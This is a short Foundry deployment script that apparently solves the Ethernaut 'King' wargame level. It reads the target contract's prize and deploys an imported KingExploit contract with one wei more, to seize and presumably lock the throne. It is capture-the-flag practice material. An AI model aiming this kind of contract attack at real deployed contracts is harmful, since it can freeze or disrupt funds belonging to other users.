// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {KingExploit} from "../src/KingExploit.sol";

interface IKing {
    function prize() external view returns (uint256);
}

contract KingAttack is Script {
    function run() external {
        address payable kingLevel = payable(0x9A79e3704CB220F165304e669b9Ed2bA6765B53d);

        // 获取当前 prize，发送 prize + 1 wei 来成为 King
        uint256 currentPrize = IKing(kingLevel).prize();
        uint256 amountToSend = currentPrize + 1 wei;

        vm.startBroadcast();
        new KingExploit{value: amountToSend}(kingLevel);
        vm.stopBroadcast();
    }
}
